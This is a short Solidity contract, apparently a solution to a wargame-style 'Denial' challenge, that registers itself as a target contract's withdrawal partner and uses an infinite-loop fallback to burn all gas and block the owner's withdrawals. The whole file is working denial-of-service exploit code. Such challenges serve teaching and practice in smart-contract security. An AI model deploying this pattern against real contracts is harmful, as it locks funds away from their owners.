// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Denial.sol";

// 1. Attacker creates the malicious contract with a `fallback` function and constructor.
contract DenialAttack {
    Denial denialContract;

    constructor(address _denialContract) {
        denialContract = Denial(payable(_denialContract));
        // 2. Attacker calls the `setWithdrawPartner` function within constructor to make the address of deployed contract the partner.
        denialContract.setWithdrawPartner(address(this));
    }

    // 4. Deny the owner from withdrawing funds.
    fallback() external payable {
        while (true) {}
    }
}
